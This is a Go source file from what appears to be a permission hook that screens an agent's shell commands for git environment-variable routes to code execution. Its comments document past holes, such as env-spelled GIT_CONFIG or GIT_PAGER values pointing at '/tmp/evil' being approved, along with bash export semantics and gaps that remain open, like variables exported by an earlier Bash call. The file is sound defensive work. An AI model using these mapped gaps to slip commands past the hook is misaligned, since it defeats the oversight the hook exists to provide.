// # WHICH SPELLINGS REACH GIT'S ENVIRONMENT, MEASURED RATHER THAN ASSUMED
//
// The screens are about the environment git INHERITS, so a spelling that never leaves the
// shell is not a hazard and screening it would be a false prompt. bash 5.3.9, 2026-08-14,
// reading the variable in a real child process:
//
//	SPELLING                                REACHES THE CHILD?
//	NAME=v; child                           no   — a shell variable is not an env variable
//	NAME=v && child                         no   — same
//	export NAME=v; child                    YES
//	NAME=v; export NAME; child              YES  — the bare form exports an EXISTING value
//	declare NAME=v; child                   no   — declare does not export
//	declare -x / typeset -x / -gx NAME=v    YES
//	set -a; NAME=v; child                   YES  — allexport turns every later assignment into an export
//	export NAME=v | cat; child              no   — a pipeline stage is a subshell
//	(export NAME=v); child                  no   — a subshell scopes it
//	export NAME=v; unset NAME; child        no   — and export -n likewise un-exports
//
// So the plain `NAME=v;` spelling is NOT screened — that would be a false prompt on
// ordinary traffic — UNLESS an earlier leaf turned on `allexport`, which is a visible
// `set -a` leaf and is modelled. That keeps the fail-closed property without paying for it
// on the common shape.
//
// # THE OVER-APPROXIMATIONS, ALL TOWARD THE PROMPT AND ALL DELIBERATE
//
//  1. A `declare`/`typeset` leaf is read WHATEVER ITS FLAGS SAY, so the unexported
//     `declare NAME=v` is screened too. Deciding the net export state per name means
//     modelling clustered `-gx`, the un-exporting `+x`, and function scope — the same
//     modelling cmdparse.InCommandVars' own SCOPE comment declines for `declare` — and
//     getting it wrong fails OPEN. One prompt on a spelling nobody writes at a hook
//     boundary is the cheaper error.
//  2. VALUES FROM A `declare`-FAMILY LEAF ARE TREATED AS UNKNOWN, never read, because
//     bash's attributes change what the value IS (`declare -i N=5+5` binds `10`). An
//     unknown value can never reach the editor carve-out, which is the fail-closed
//     direction — see hasGitProgramEnvVar's guard 1.
//  3. `unset` AND `export -n` ARE NOT MODELLED, so `export GIT_DIR=/x; unset GIT_DIR; git
//     status` is screened although git sees nothing. Modelling revocation would mean
//     tracking it per name for a verdict that moves one way only.
//  4. A SUBSHELL'S EXPORT IS TREATED AS PERSISTING. The lowering emits a subshell's
//     statements into the same flat leaf list, so `(export GIT_PAGER=/tmp/evil); git log`
//     reads here as though the export survived. This is the RESIDUAL
//     cmdparse.InCommandVars records for the same reason and pg2-4ak2k tracks; closing it
//     needs a subshell SCOPE PATH on the leaf, which is that bead's change, not this one's.
//  5. A DUPLICATE LEAF TEXT RESOLVES TO ITS LAST OCCURRENCE. `git log; export
//     GIT_PAGER=/tmp/evil; git log` has two byte-identical `git log` leaves, so matching
//     by Raw is ambiguous; taking the LAST match means the FIRST `git log` is judged as if
//     the export had already happened. Over-restrictive for that leaf, and the only
//     direction that does not let the real one slip through.
//
// # SCOPE FALLBACK
//
// Under the engine a rule receives ONE leaf and the whole expression as
// hookio.HookInput.RootExpression, so the sibling leaves are recovered by re-parsing that
// and locating this leaf by its Raw text — the same seam internal/rules/gitdir uses, and
// the relation cmdparse.DownstreamStages documents as exact ("the engine builds a leaf's
// synthetic HookInput from that same Raw"). A DIRECT caller (a unit test, any non-engine
// caller) is handed the whole expression already, so its own leaves ARE the expression and
// `before` is already the right index. When RootExpression is empty or nothing matches,
// this degrades to exactly the leaf-local behaviour every screen had before, which is why
// no verdict can regress through this path.
func visibleEnvVars(input *hookio.HookInput, leaves []cmdparse.ParsedCommand, before int) []cmdparse.EnvAssignment {
	if before < 0 || before >= len(leaves) {
		return nil
	}
	scope, at := expressionScope(input, leaves, before)
	own := leaves[before].EnvVars
	prior := exportedEnvVarsBefore(scope, at)
	if len(prior) == 0 {
		return own
	}
	// The leaf's OWN prefix goes last so it wins any duplicate-name comparison a future
	// consumer makes: a prefix assignment is what the child really receives.
	return append(prior, own...)
}

// expressionScope returns the leaves of the EXPRESSION `leaves[before]` belongs to, and
// that leaf's index within them. See visibleEnvVars' SCOPE FALLBACK for the two cases and
// why the fallback cannot regress a verdict.
func expressionScope(input *hookio.HookInput, leaves []cmdparse.ParsedCommand, before int) ([]cmdparse.ParsedCommand, int) {
	if input == nil || input.RootExpression == "" {
		return leaves, before
	}
	root := cmdparse.Parse(input.RootExpression)
	// The LAST match, not the first — over-approximation 5 in visibleEnvVars' list.
	at := -1
	for j := range root {
		if root[j].Raw == leaves[before].Raw {
			at = j
		}
	}
	if at < 0 {
		return leaves, before
	}
	return root, at
}

// exportedEnvVarsBefore collects the assignments the leaves BEFORE index `before` put into
// the environment a later child process inherits. See visibleEnvVars for the measured
// spelling-by-spelling table this implements and for the over-approximations.
func exportedEnvVarsBefore(leaves []cmdparse.ParsedCommand, before int) []cmdparse.EnvAssignment {
	var out []cmdparse.EnvAssignment
	allExport := false
	for k := 0; k < before && k < len(leaves); k++ {
		pc := leaves[k]
		// A PIPELINE STAGE runs in a subshell, so nothing it exports reaches a later leaf
		// — measured: `export NAME=v | cat` leaves NAME unset in a later child. Same
		// exclusion, and the same reason, as cmdparse's own shellVarWrites.
		if inMultiStagePipelineStage(leaves, k) {
			continue
		}
		switch pc.Executable {
		case "set":
			// `set -a` / `set -o allexport` makes every LATER plain assignment an export.
			// `set +a` is deliberately not modelled: once allexport has been seen this
			// stays on, which over-approximates toward the prompt.
			if setsAllExport(pc.Args) {
				allExport = true
			}
		case "export":
			// cmdparse lifts `export NAME=VALUE` arguments into EnvVars and leaves a BARE
			// `export NAME` in Args, so both halves have to be read — the bare form
			// exports a value set by an earlier Bash call, which is a value nothing here
			// can see and therefore the one that most needs to fail closed.
			out = append(out, pc.EnvVars...)
			out = append(out, namesWithUnknownValues(pc.Args)...)
		case "declare", "typeset":
			// The lowering keeps a declare-family leaf's assignments in Args. Values are
			// never read from here — over-approximation 2 — so every name it mentions
			// arrives with an unknown value.
			out = append(out, namesWithUnknownValues(pc.Args)...)
		case "":
			// A command-less leaf carrying its own assignments. These are SHELL variables
			// and reach no child (measured) unless allexport is on.
			if allExport {
				out = append(out, pc.EnvVars...)
			}
		}
	}
	return out
}

// setsAllExport reports whether a `set` invocation turns on allexport, in either spelling
// bash accepts — the clustered short (`-a`, and `a` inside a cluster such as `-ax`) or the
// long `-o allexport`.
func setsAllExport(args []string) bool {
	for i, a := range args {
		if a == "-o" && i+1 < len(args) && args[i+1] == "allexport" {
			return true
		}
		if strings.HasPrefix(a, "-o") && strings.TrimPrefix(a, "-o") == "allexport" {
			return true
		}
		if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsRune(a, 'a') {
			return true
		}
	}
	return false
}

// namesWithUnknownValues turns an assignment-builtin's ARGUMENTS into assignments whose
// VALUE is explicitly unknown. Flags are skipped; every other argument contributes its
// identifier prefix, which covers the bare `NAME`, the `NAME=VALUE` form and bash's
// array-element `m[k]=v` (whose `m` is the name that changes).
//
// cmdparse.ExpansionUnknown is the load-bearing part, not a placeholder: it is what makes
// these assignments unable to reach the editor carve-out, whose first guard requires
// ExpansionNone (hasGitProgramEnvVar). So a name arriving through here is screened
// value-blind even when the text beside it happens to spell an inert literal.
func namesWithUnknownValues(args []string) []cmdparse.EnvAssignment {
	var out []cmdparse.EnvAssignment
	for _, a := range args {
		if strings.HasPrefix(a, "-") || strings.HasPrefix(a, "+") {
			continue
		}
		end := strings.IndexAny(a, "[=")
		if end < 0 {
			end = len(a)
		}
		name := strings.TrimSuffix(a[:end], "+")
		if name == "" {
			continue
		}
		out = append(out, cmdparse.EnvAssignment{Name: name, Raw: a, Expansion: cmdparse.ExpansionUnknown})
	}
	return out
}

// inMultiStagePipelineStage reports whether leaf i is one stage of a MULTI-STAGE pipeline.
// A lone command is a one-stage pipeline and is not one of these.
//
// It is a local reimplementation of cmdparse's unexported `inMultiStagePipeline` rather
// than a shared helper, because exporting one would widen that package's API for a single
// consumer; the pipeline coordinates it reads (PipelineID / PipelineIndex) are already
// exported and are documented as per-Parse-call, which is satisfied here — `leaves` is one
// Parse's output throughout.
func inMultiStagePipelineStage(leaves []cmdparse.ParsedCommand, i int) bool {
	pc := leaves[i]
	if pc.PipelineID < 0 { // a synthesized leaf stands in no pipeline
		return false
	}
	if pc.PipelineIndex > 0 {
		return true
	}
	for j, other := range leaves {
		if j != i && other.PipelineID == pc.PipelineID && other.PipelineIndex > pc.PipelineIndex {
			return true
		}
	}
	return false
}

// hasGitConfigEnvInjection reports whether this leaf's own env-assignment prefix
// carries a variable through which git takes CONFIGURATION from the caller — the
// ENV spelling of the pre-subcommand `-c` that hasGitConfigInjection screens.
//
// THE HOLE IT CLOSES (pg2-a12rl, found while working pg2-a5r9r). `gatedConfigKeys`
// already classes `core.fsmonitor`, `core.pager`, `diff.external` and their
// siblings as configSink — "git EXECUTES the value … during an ordinary git
// operation" — and hasGitConfigInjection defers a pre-subcommand `-c` as "a known
// RCE class". The env route was unscreened: hasRedirectEnvVar knows only `GIT_DIR`
// and `GIT_WORK_TREE`, so measured through the real binary in this worktree,
// 2026-08-13,
//
//	GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=/tmp/evil git status
//
// emitted `permissionDecision: "allow"`, while the argv-equivalent
// `git -c core.fsmonitor=/tmp/evil status` emitted `{}`. One hazard, two spellings,
// opposite answers.
//
// # WHICH VARIABLES, MEASURED RATHER THAN READ OFF THE DOCS
//
// git 2.54.0, 2026-08-13, throwaway repo in the scratchpad, `core.fsmonitor` (and
// where noted `diff.external` / `core.sshCommand`) pointed at a marker script that
// appends to a file and exits 1. `scripts/probe-pg2-a12rl.sh` reproduces it:
//
//	VARIABLE                                REACHES THE SINK?
//	GIT_CONFIG_COUNT + KEY_<n>/VALUE_<n>    YES — marker ran on `git status` and on `git diff`
//	GIT_CONFIG_GLOBAL                       YES — marker ran on `git status`
//	GIT_CONFIG_SYSTEM                       YES — marker ran on `git ls-remote` via core.sshCommand
//	GIT_CONFIG_PARAMETERS                   YES — marker ran on `git status` (git's own `-c` propagation channel)
//	GIT_CONFIG (legacy)                     NOT for a general read — but `git config --get` DOES read it, so it redirects where a config WRITE lands
//	GIT_CONFIG_NOSYSTEM                     no — it SUPPRESSES a config source; it cannot name a program
//
// TWO READINGS THAT WOULD HAVE BEEN WRONG, recorded because each looked decisive:
//
//   - `GIT_CONFIG_SYSTEM` first measured NO SINK for both `core.fsmonitor` and
//     `diff.external`, which reads as "git ignores it". It does not: this machine's
//     own `~/.gitconfig` sets `core.fsmonitor=false` and `~/.config/git/config` sets
//     `diff.external=difft`, and GLOBAL outranks SYSTEM, so the variable lost a
//     PRECEDENCE contest rather than being unread. Re-measured with a key set
//     nowhere else (`core.sshCommand`) the marker ran, and
//     `GIT_CONFIG_SYSTEM=<file> git config --get foo.bar` printed the file's value
//     with `--show-origin` naming the file. A no-sink reading against ONE key is not
//     evidence about the VARIABLE.
//   - The `-c` route already being screened does not make this one screened. It is a
//     different token span: hasGitConfigInjection walks `pc.Args`, and an env
//     assignment is never in `Args` — cmdparse lifts it to `pc.EnvVars`.
//
// # WHY IT IS KEY-BLIND, AND WHY THAT IS THE STRONGER FORM OF THE KEY SCREEN
//
// It matches on the variable NAME and never reads the key, exactly as `-c` is
// key-blind. That is a strict SUPERSET of "names a gatedConfigKeys key", so the
// key screen is satisfied a fortiori — TestGit_ConfigEnvInjection_EveryGatedKeyIsScreened
// iterates the real table and asserts it, so a key added there extends this
// automatically and NO second key table exists to drift. Reading the key would be
// strictly weaker, because the key is often not there to read:
//
//   - `GIT_CONFIG_GLOBAL` / `GIT_CONFIG_SYSTEM` / `GIT_CONFIG` name a FILE. Its keys
//     are whatever the file says at the moment git opens it, which no argv analysis
//     can know.
//   - A value may be dynamic: `GIT_CONFIG_KEY_0=$K` carries no key at all.
//   - Config keys are CASE-INSENSITIVE to git — measured: `GIT_CONFIG_KEY_0=CORE.FSMonitor`
//     ran the marker — so a key read would have to route through configKeyID's
//     lowercasing to be sound, one more place to get wrong for no gain.
//   - `GIT_CONFIG_PARAMETERS` packs its pairs into one shell-quoted string.
//
// A key-blind name match has none of those failure modes, so a PARTIAL or malformed
// prefix cannot slip through: it is screened for carrying the variable, whatever the
// rest says. (git itself refuses the partial form outright — measured, `COUNT=2` with
// one pair answers `error: missing config key GIT_CONFIG_KEY_1` / `fatal: unable to
// parse command-line config` — but this predicate does not depend on that.)
//
// The cost is over-approximation, all toward the prompt and all deliberate:
// `GIT_CONFIG_GLOBAL=/dev/null git status` (a hygiene idiom that DISARMS config) and
// `GIT_CONFIG_NOSYSTEM=1` are screened too, as is any future `GIT_CONFIG_*` git
// grows. That is the same direction gatedConfigKeys' own over-approximations take
// (it gates `--unset` of a gated key, and `core.fsmonitor true`).
//
// THE NAME MATCH IS CASE-SENSITIVE, matching git's own getenv: measured, the
// lowercase triple `git_config_count=1 git_config_key_0=core.fsmonitor … git status`
// did NOT run the marker, so gating it would gate a command git treats as ordinary.
//
// # WHAT IT DOES NOT REACH — recorded, not silently left
//
//   - A variable ALREADY EXPORTED BY AN EARLIER BASH CALL. CETA receives no environment,
//     so a variable a previous tool call exported is invisible here and to every other
//     rule; nothing in one hook payload can recover it.
//
//     A PERSISTENT assignment IN THE SAME EXPRESSION IS NOW REACHED (pg2-xjt1s). `export
//     GIT_CONFIG_COUNT=…; git status` was the more common in-corpus spelling — 111 of the
//     183 GIT_CONFIG-assignment-bearing rows — and it used to be unscreened because this
//     predicate read one leaf's own prefix. It now takes the VISIBLE environment instead:
//     see visibleEnvVars for the approach ruling, the measured bash export semantics, and
//     the over-approximations. hasRedirectEnvVar and hasGitProgramEnvVar moved in the same
//     change, because fixing one of three leaf-local screens would have left the other two
//     as the cheaper route to the same hazard.
//
//   - The GIT_* variables that ARE the env twin of a gated sink but do NOT spell
//     "config": measured the same day, `GIT_EXTERNAL_DIFF=<marker> git diff` and
//     `GIT_SSH_COMMAND=<marker> git ls-remote ssh://…` both RAN the marker, and they
//     are `diff.external` and `core.sshCommand` — two configSink entries — by another
//     name. `GIT_PAGER`, `GIT_EDITOR` and `GIT_ASKPASS` are the same shape. They were
//     out of scope for pg2-a12rl, which is scoped to the config-SOURCE variables, and
//     are NOW SCREENED BY THEIR OWN SIBLING PREDICATE — see gitProgramEnvVars and
//     hasGitProgramEnvVar (pg2-6c85x), which carries that family's own measurements,
//     its value-blind ruling, the editor-family value carve-out pg2-6qh3p added to it,
//     and the variable it still declines.
//
// WHY NOT hasRedirectEnvVar. That predicate is consulted per ARM, and only by the
// arms that modify (`checkout`, `rebase`, `filter-branch`, `reset`, the
// modifyingSubcommands fall-through, a config write). Adding these names to it would
// leave `git status` and `git log` — the measured hole, and the shapes that reach
// `core.fsmonitor` — still approved, and would answer the redirect Ask, a verdict
// no ruling supports for this route. See the call site in Evaluate for why the
// verdict is a demotion instead.
func hasGitConfigEnvInjection(envs []cmdparse.EnvAssignment) bool {
	for _, ev := range envs {
		if ev.Name == "GIT_CONFIG" || strings.HasPrefix(ev.Name, "GIT_CONFIG_") {
			return true
		}
	}
	return false
}

// gitProgramEnvVars maps each `GIT_*` environment variable MEASURED to name a program
// git EXECUTES to the `git config` key it is the env spelling of. hasGitProgramEnvVar is
// the screen; the twin is recorded so the justification is CHECKABLE against
// gatedConfigKeys rather than merely asserted — TestGit_ProgramEnvVar_TwinIsAConfigSinkInTheRealTable
// resolves each one through configKeyID and requires it to be a configSink there.
//
// THE HOLE IT CLOSES (pg2-6c85x, found and measured while working pg2-a12rl).
// pg2-a12rl screened the config-SOURCE family — `GIT_CONFIG*`, which names a config FILE
// or key/value PAIRS. These name the PROGRAM directly, with no config key in between, so
// they were outside that bead's scope and outside its screen: the argv route
// `git -c diff.external=<prog> diff` was deferred while `GIT_EXTERNAL_DIFF=<prog> git
// diff` was APPROVED. One exec sink, two spellings, opposite answers — the same
// inconsistency pg2-a12rl closed, one level down.
//
// # WHICH VARIABLES, MEASURED RATHER THAN READ OFF THE DOCS
//
// git 2.54.0, 2026-08-13, throwaway repo under a mktemp directory, each variable pointed
// at a marker script that appends to a file. `scripts/probe-pg2-6c85x.sh` reproduces it:
//
//	VARIABLE              TWIN               REACHES THE SINK?
//	GIT_EXTERNAL_DIFF     diff.external      YES — `git diff` ran the marker with git's 7-argument diff-driver argv
//	GIT_SSH_COMMAND       core.sshCommand    YES — `git ls-remote ssh://…` ran it as `-G -o SendEnv=GIT_PROTOCOL <host>`
//	GIT_SSH               core.sshCommand    YES — same argv; the older variant, honoured when GIT_SSH_COMMAND is unset
//	GIT_EDITOR            core.editor        YES — `git commit --amend` ran it on .git/COMMIT_EDITMSG
//	GIT_ASKPASS           core.askPass       YES — `git credential fill` ran it as the "Username for …" prompt
//	GIT_PAGER             core.pager         YES, ONLY WITH A TERMINAL ON STDOUT — see the pager note below
//	GIT_SEQUENCE_EDITOR   sequence.editor    YES — `git rebase -i HEAD~1` ran it on .git/rebase-merge/git-rebase-todo — DECLINED by pg2-6c85x, NOW SCREENED by pg2-6qh3p under the inert-value carve-out
//	GIT_PROXY_COMMAND     core.gitProxy      YES — `git ls-remote git://…` ran it as `<host> 9418` — DECLINED by pg2-6c85x, NOW SCREENED by pg2-qi1jo's family ruling
//
// THE PAGER READING IS THE ONE THAT NEEDED A SECOND INSTRUMENT, recorded because the
// first reading looked decisive and was not. `GIT_PAGER=<marker> git log` showed NO SINK,
// and so did `git --paginate log` — because git resolves the pager as
// `git_pager(isatty(1))` and returns NULL when stdout is not a terminal, `--paginate`
// notwithstanding. That is a property of the STDOUT the probe gave it, not of the
// variable: re-run under a real pty (expect(1)) the marker RAN, and `git var GIT_PAGER`
// printed the marker path with no tty at all. The `-c core.pager` twin behaves
// IDENTICALLY on both instruments, which is what makes the relation to it sound.
// A no-sink reading under one stdout is not evidence about the VARIABLE.
//
// TWO OTHER READINGS THAT WOULD HAVE BEEN WRONG, both PRECEDENCE losses of exactly the
// kind pg2-a12rl hit with `GIT_CONFIG_SYSTEM`:
//
//   - `git -c core.editor=<marker> commit --amend` showed no sink. Not because `-c` is
//     ignored: this shell already exports `GIT_EDITOR=true`, and GIT_EDITOR OUTRANKS
//     core.editor. With it unset the marker ran. Confirmed by `git var GIT_EDITOR`,
//     which printed the env value while `-c core.editor` was also present.
//   - `GIT_EXTERNAL_DIFF` had to be re-measured with `GIT_CONFIG_GLOBAL=/dev/null
//     GIT_CONFIG_SYSTEM=/dev/null`, because this machine's `~/.config/git/config` sets
//     `diff.external=difft`. It ran the marker BOTH ways, so the variable wins over the
//     configured differ — which also means an external differ being configured here does
//     not mask the route.
//
// # WHY IT IS VALUE-BLIND, WHICH IS THE DELIBERATE CHOICE THIS FAMILY INVITES
//
// Unlike the config-source family, these variables' values ARE the program, so a value
// read is possible here in a way it was not there. It is still refused, for two reasons
// that both cut the same way:
//
//  1. THE `-c` ROUTE IS VALUE-BLIND FOR THESE KEYS. `git -c core.pager=cat log` is
//     screened, so sparing `GIT_PAGER=cat git log` would make the env spelling WEAKER
//     than the argv one for the same benign value — this bead's own defect, re-created
//     in the opposite direction, and it would break the relation tests that are its
//     acceptance criteria.
//  2. "BENIGN" IS NOT A WORD-LIST QUESTION. git runs the pager, the editor and the ssh
//     command THROUGH A SHELL, and the diff/ssh values carry arguments in real use
//     (`GIT_SSH_COMMAND="ssh -i /tmp/k"`, measured `GIT_EXTERNAL_DIFF='difft
//     --display=inline'`). Deciding a value is inert therefore means shell-parsing it and
//     resolving what it would exec — a second analysis, failing open on whatever it does
//     not anticipate, for a verdict that is `{}` either way.
//
// So the screen keys on the NAME, exactly as `-c` keys on nothing at all. The cost is
// over-approximation, all toward the prompt: `GIT_PAGER=cat` and `GIT_EXTERNAL_DIFF=`
// (the idiom that DISARMS this workspace's configured differ) are screened too. That is
// the same direction gatedConfigKeys' own over-approximations take.
//
// # THE ONE BOUNDED EXCEPTION: THE EDITOR FAMILY (pg2-6qh3p)
//
// gitEditorEnvVars — `GIT_EDITOR` and `GIT_SEQUENCE_EDITOR` — is VALUE-READING, by
// operator ruling of 2026-08-13. It does NOT relax reason 1 above: the ruling carves the
// same two inert values out of the ARGV spellings in the same change
// (clearedConfigFlagPairs' `core.editor` / `sequence.editor` entries), so env and argv
// still answer alike and pg2-6c85x's relation tests still hold. Nor does it relax reason
// 2: the allowance is two EXACT literal tokens, not a judgement about which programs are
// benign, so there is no shell-parsing and nothing to fail open on. Every OTHER variable
// in gitProgramEnvVars stays value-blind, and `GIT_EDITOR=true` was the row that made
// the exception worth having — see isInertEditorValue for the ruling and its three
// constraints.
//
// AND THE REMAINING COST IS AVOIDABLE, WHICH IS WHY IT IS ACCEPTABLE AT THIS VOLUME.
// Every newly-prompting idiom in the 2026-08-13 replay has an ARGV equivalent that git
// itself provides and that this screen does not touch — measured through the real binary,
// all four still `allow`:
//
//	GIT_EXTERNAL_DIFF= git diff        ->  git --no-ext-diff diff  /  git diff --numstat
//	GIT_PAGER=cat git log              ->  git --no-pager log
//	GIT_EDITOR=/tmp/e git commit --am… ->  git commit --amend --no-edit
//	GIT_SEQUENCE_EDITOR=<prog> rebase  ->  GIT_SEQUENCE_EDITOR=: with the todo edited by
//	                                       a separate, separately-judged command
//
// The flags say the same thing without handing git a program, so they are not a bypass:
// each SUPPRESSES a sink rather than naming one. A caller who hits a prompt has a
// strictly-safer spelling one flag away.
//
// THE NAME MATCH IS CASE-SENSITIVE, matching git's own getenv, and it is EXACT rather
// than prefixed — the opposite of hasGitConfigEnvInjection's `GIT_CONFIG_` prefix, and
// deliberately so. Measured: the lowercase spellings `git_external_diff`,
// `git_ssh_command` and `Git_Pager` did NOT run the marker, so gating them would gate
// commands git treats as ordinary. A prefix match is wrong here because there is no
// prefix that means "names a program": `GIT_SSH_VARIANT` selects a command-line dialect
// and `GIT_EXTERNAL_DIFF_OPTS` is not a variable git reads for the driver, yet both sit
// under any prefix that would catch the real ones. The enumeration is the boundary, and
// it is only sound BECAUSE it is measured.
//
// # WHAT IT DOES NOT REACH — recorded, not silently left
//
// A variable ALREADY EXPORTED BY AN EARLIER BASH CALL. CETA receives no environment, so
// that value is invisible to every rule and no seam in one hook payload can recover it.
//
// A PERSISTENT assignment IN THE SAME EXPRESSION IS NOW REACHED (pg2-xjt1s). `export
// GIT_PAGER=…; git log` used to be unscreened because this predicate read one leaf's own
// prefix — the SAME leaf-local limit hasGitConfigEnvInjection and hasRedirectEnvVar had.
// All three now take the VISIBLE environment, in one change, because closing one of them
// would have left the other two as the cheaper route to the same hazard. See visibleEnvVars
// for the approach ruling and the over-approximations, and note ONE deliberate exception:
// hasSequenceEditorEnvVar stays LEAF-LOCAL, because widening a REQUIREMENT is a
// RELAXATION — `export GIT_SEQUENCE_EDITOR=:; git rebase -i main` would gain an Approve it
// does not have today, which needs its own ruling and its own replay.
var gitProgramEnvVars = map[string]string{
	"GIT_EXTERNAL_DIFF": "diff.external",
	"GIT_SSH_COMMAND":   "core.sshCommand",
	"GIT_SSH":           "core.sshCommand",
	"GIT_EDITOR":        "core.editor",
	"GIT_PAGER":         "core.pager",
	// `core.askPass` WAS the one twin absent from gatedConfigKeys, recorded here by
	// pg2-6c85x rather than resolved because adding it changes a `git config` PORCELAIN
	// verdict — a route that bead did not measure. RESOLVED by pg2-h1ori (2026-08-14): the
	// key is now in gatedConfigKeys as a configSink, so all three spellings of this sink
	// are screened and the `absentTwins` exception in programenv_test.go is GONE with it.
	// The asymmetry mattered because it ran the wrong way round — the PERSISTENT spelling
	// was the unscreened one. See gatedConfigKeys' "ADDED AFTER THE SURVEY" entry.
	"GIT_ASKPASS": "core.askPass",
	// SCREENED SINCE pg2-6qh3p, having been DECLINED by pg2-6c85x. It was never declined
	// for want of evidence — `git rebase -i HEAD~1` ran a marker on
	// `.git/rebase-merge/git-rebase-todo` — but for a CONFLICT: this rule's own rebase arm
	// REQUIRES the variable, so a value-BLIND screen would have demoted exactly the
	// scripted-rebase idiom the rule mandates, and pg2-a12rl's landed configenv_test.go
	// pins `GIT_SEQUENCE_EDITOR=: git rebase -i main` at Approve. Measured over the 152-day
	// ask log on 2026-08-13, a blind screen would have started prompting 17 replayable
	// `allow` rows out of 71 carrying the assignment. The 2026-08-13 operator ruling
	// resolves the conflict by reading the VALUE instead: the two INERT literals clear, so
	// the mandated idiom keeps its Approve, while a real program is screened like every
	// other exec sink. That is why this entry MOVED rather than the rebase arm changing.
	// See isInertEditorValue and gitEditorEnvVars.
	"GIT_SEQUENCE_EDITOR": "sequence.editor",
	// SCREENED SINCE pg2-qi1jo, having been DECLINED by pg2-6c85x. It was never declined
	// for want of evidence — `git ls-remote git://invalid.invalid/x.git` ran a marker as
	// `invalid.invalid 9418` — but because its twin `core.gitProxy` sat in gatedConfigKeys'
	// left-approved list under an EXPLICIT instruction to settle the alternate-transport
	// family "under one ruling", and screening the env half alone would have split that
	// ruling across two routes. pg2-qi1jo made the ruling for the WHOLE family, so this
	// entry MOVED rather than the instruction being worked around. See gatedConfigKeys'
	// "ADDED AFTER THE SURVEY" entry for the family's measurements and for why the
	// unauthenticated `git://` transport is what settles the trust question.
	"GIT_PROXY_COMMAND": "core.gitProxy",
}

// gitEditorEnvVars is the subset of gitProgramEnvVars whose VALUE is read rather than
// ignored — the editor family, carved out by the operator ruling of 2026-08-13
// (pg2-6qh3p). Membership means "screened UNLESS the value is one of the two inert
// literals"; absence means "screened whatever the value says", which is the posture of
// every other entry in that table and of pg2-a12rl's sibling screen.
//
// IT IS A SEPARATE SET RATHER THAN A SENTINEL IN gitProgramEnvVars because that table's
// VALUES are load-bearing: each is the `git config` key the variable is the env spelling
// of, and TestGit_ProgramEnvVar_TwinIsAConfigSinkInTheRealTable resolves every one of
// them through configKeyID against gatedConfigKeys. Overloading it would break the check
// that keeps the screen's justification honest.
//
// THE ARGV TWINS ARE CARVED OUT IN THE SAME CHANGE, which is constraint (a) of the
// ruling: `core.editor` and `sequence.editor` in clearedConfigFlagPairs use the SAME
// predicate. Carving out only this half would make the env spelling LESS restrictive than
// argv — the relation pg2-6c85x established and its tests assert.
var gitEditorEnvVars = map[string]bool{
	"GIT_EDITOR":          true,
	"GIT_SEQUENCE_EDITOR": true,
}

// declinedGitProgramEnvVars records the variables MEASURED to reach an exec sink that are
// nevertheless NOT screened, with the reason for each. Nothing here is declined for want
// of evidence — each ran the marker (see gitProgramEnvVars' table) — and in each case the
// reason is a ruling that already exists elsewhere and would be CONTRADICTED by screening
// the env half alone. TestGit_ProgramEnvVar_DeclinedVariablesStayUnscreened pins the
// consequence, so removing a variable from here is a deliberate act.
//
// BOTH ORIGINAL MEMBERS HAVE LEFT, EACH BECAUSE ITS CONFLICTING RULING WAS RESOLVED
// RATHER THAN WORKED AROUND, and that is the pattern a later reader should expect of this
// table — a member leaves when the ruling it deferred to is MADE:
//
//   - `GIT_SEQUENCE_EDITOR` (pg2-6qh3p, operator ruling of 2026-08-13). Its conflicting
//     ruling could be honoured WITHOUT leaving the sink open once the VALUE was read — see
//     the entry that now carries it in gitProgramEnvVars.
//   - `GIT_PROXY_COMMAND` (pg2-qi1jo, 2026-08-14). Its conflict was about which KEYS a
//     future ruling should cover, so no value predicate could resolve it — the RULING had
//     to be made, and pg2-qi1jo made it for the whole alternate-transport family. Both
//     halves moved in the same change, which is what the deferred instruction asked for.
//
// THE MAP MAY LEGITIMATELY BE EMPTY. It is a register of OUTSTANDING declinations, not a
// permanent list, so an empty map means every measured sink is screened —
// TestGit_ProgramEnvVar_DeclinedVariablesStayUnscreened is written to accept that rather
// than to require a member.
// THE REGISTER IS NOW EMPTY, and its last member left the way the two before it did — the
// ruling it deferred to was MADE rather than worked around:
//
//   - `GIT_ALLOW_PROTOCOL` (pg2-nd6i3, 2026-08-14). It was declined for a TABLE-SHAPE
//     reason, not a policy one: it is the env twin of `protocol.<n>.allow`, which is
//     configINTERLOCK, and this file had no interlock env screen for it to join. That
//     screen now exists — see gitInterlockEnvVars — so the variable MOVED there, together
//     with `GIT_SSL_NO_VERIFY` (unscreened for exactly the same reason) and with
//     `GIT_PROTOCOL_FROM_USER`, which the enumeration that bead required turned up and
//     which no earlier bead had named. All three in one change, which is what the
//     alternate-transport family's "under one ruling" instruction asked for.
//
// An empty map means every measured sink and every measured interlock is screened. Do NOT
// add a placeholder to keep it non-empty —
// TestGit_ProgramEnvVar_DeclinedVariablesStayUnscreened is written to accept empty.
var declinedGitProgramEnvVars = map[string]string{}

// hasGitProgramEnvVar reports whether this leaf's own env-assignment prefix carries a
// variable through which git takes the PROGRAM IT EXECUTES from the caller. See
// gitProgramEnvVars for the measured variable-by-variable evidence, for why the NAME match
// is exact and case-sensitive, for why it is value-blind everywhere except the editor
// family, and for the variable deliberately declined.
//
// THE EDITOR CARVE-OUT IS THE ONLY VALUE READ (pg2-6qh3p), and it is guarded twice so it
// FAILS CLOSED, which is constraint (c) of the ruling:
//
//  1. cmdparse's own ExpansionNone classification — the value must be STATIC. `$X`,
//     `$(echo true)`, `${EDITOR:-vi}` and `$((…))` are all excluded before the token is
//     ever compared, so no future widening of the token set can admit a dynamic value.
//  2. isInertEditorValue — an EXACT-TOKEN match against two literals, never a prefix or
//     substring.
//
// Neither guard alone is enough on its own terms: check 1 without check 2 would clear any
// static program name, and check 2 without check 1 would leave the fail-closed property
// resting on the token set never growing. Together, a value reaches the carve-out only by
// being statically, exactly one of two inert literals.
func hasGitProgramEnvVar(envs []cmdparse.EnvAssignment) bool {
	for _, ev := range envs {
		if _, screened := gitProgramEnvVars[ev.Name]; !screened {
			continue
		}
		if gitEditorEnvVars[ev.Name] && ev.Expansion == cmdparse.ExpansionNone && isInertEditorValue(ev.Value) {
			continue
		}
		return true
	}
	return false
}

// gitInterlockEnvVars maps each `GIT_*` environment variable MEASURED to REMOVE A REFUSAL
// GIT MAKES BY DEFAULT to the `git config` key it is the env spelling of. It is the THIRD
// env table in this file, and it had to be created rather than extended into (pg2-nd6i3):
